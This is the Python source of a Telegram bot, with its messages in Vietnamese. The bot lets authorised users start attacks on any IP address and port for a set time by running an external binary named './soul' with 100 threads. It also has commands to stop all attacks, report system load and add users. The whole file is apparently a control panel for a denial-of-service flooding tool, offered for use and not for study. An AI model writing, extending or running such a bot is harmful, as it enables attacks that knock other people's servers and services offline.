import telebot
import subprocess
import threading
import psutil
import os
import time

TOKEN = "YOUR_TOKEN_HERE"
OWNER_ID = 7088683094
bot = telebot.TeleBot(TOKEN)
running_attacks = {}
THREADS = 100
USERS_FILE = "allowed_users.txt"

def load_allowed_users():
    if not os.path.exists(USERS_FILE):
        return {OWNER_ID}
    with open(USERS_FILE, "r") as f:
        return set(int(line.strip()) for line in f if line.strip().isdigit())

def save_allowed_users():
    with open(USERS_FILE, "w") as f:
        for user_id in allowed_users:
            f.write(f"{user_id}\n")

allowed_users = load_allowed_users()

def is_authorized(user_id):
    return user_id in allowed_users

def monitor_process(pid):
    try:
        process = psutil.Process(pid)
        process.wait()
        running_attacks.pop(pid, None)
    except psutil.NoSuchProcess:
        pass

@bot.message_handler(commands=['add_user'])
def add_user(message):
    if message.from_user.id != OWNER_ID:
        bot.send_message(message.chat.id, "❌ Bạn không có quyền sử dụng lệnh này.")
        return
    args = message.text.split()
    if len(args) != 2:
        bot.send_message(message.chat.id, "❌ Dùng đúng cú pháp: /add_user <user_id>")
        return
    try:
        new_user_id = int(args[1])
        allowed_users.add(new_user_id)
        save_allowed_users()
        bot.send_message(message.chat.id, f"✅ Đã thêm user `{new_user_id}` vào danh sách cho phép.", parse_mode="Markdown")
    except ValueError:
        bot.send_message(message.chat.id, "❌ user_id không hợp lệ.")

@bot.message_handler(commands=['attack'])
def run_command(message):
    if not is_authorized(message.from_user.id):
        bot.send_message(message.chat.id, "❌ Bạn không có quyền sử dụng bot.")
        return

    args = message.text.split()
    if len(args) != 3 or ':' not in args[1]:
        bot.send_message(message.chat.id, "❌ Hãy nhập đúng định dạng: /attack <IP>:<Port> <Time>")
        return

    ip_port, duration = args[1], args[2]
    ip, port = ip_port.split(':')
    try:
        process = subprocess.Popen(["./soul", ip, port, duration, str(THREADS)],
                                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        running_attacks[process.pid] = process
        threading.Thread(target=monitor_process, args=(process.pid,)).start()
        bot.send_message(message.chat.id,
                         f"🚀 **Tấn công đã bắt đầu!**\n🔹 IP: `{ip}`\n🔹 Port: `{port}`\n🔹 Thời gian: `{duration}` giây\n🔹 Luồng: `{THREADS}`",
                         parse_mode="Markdown")
    except Exception as e:
        bot.send_message(message.chat.id, f"❌ Lỗi khi chạy attack: {str(e)}")

@bot.message_handler(commands=['stop_all'])
def stop_all_attacks(message):
    if not is_authorized(message.from_user.id):
        bot.send_message(message.chat.id, "❌ Bạn không có quyền sử dụng bot.")
        return

    if not running_attacks:
        bot.send_message(message.chat.id, "✅ Không có cuộc tấn công nào đang chạy.")
        return

    for pid in list(running_attacks.keys()):
        try:
            parent = psutil.Process(pid)
            for child in parent.children(recursive=True):
                child.kill()
            parent.kill()
            running_attacks.pop(pid, None)
        except psutil.NoSuchProcess:
            pass

    subprocess.run("pkill -f './soul'", shell=True)
    bot.send_message(message.chat.id, "🛑 **Tất cả các cuộc tấn công đã bị dừng!**", parse_mode="Markdown")

@bot.message_handler(commands=['status'])
def check_status(message):
    if not is_authorized(message.from_user.id):
        bot.send_message(message.chat.id, "❌ Bạn không có quyền sử dụng bot.")
        return

    cpu_usage = psutil.cpu_percent(interval=1)
    ram_usage = psutil.virtual_memory().percent
    uptime = time.time() - psutil.boot_time()
    uptime_str = time.strftime("%H:%M:%S", time.gmtime(uptime))
    bot_status = "✅ Đang chạy"

    status_message = (f"📊 **Trạng thái hệ thống**\n"
                      f"🔹 CPU: {cpu_usage}%\n"
                      f"🔹 RAM: {ram_usage}%\n"
                      f"🔹 Uptime: {uptime_str}\n"
                      f"🤖 Bot: {bot_status}")
    bot.send_message(message.chat.id, status_message, parse_mode="Markdown")

def main():
    bot.send_message(OWNER_ID, "🤖 **Bot đã khởi động!**")
    bot.polling()

if __name__ == "__main__":
    while True:
        try:
            main()
        except Exception as e:
            print(f"Lỗi xảy ra: {e}")
            time.sleep(5)
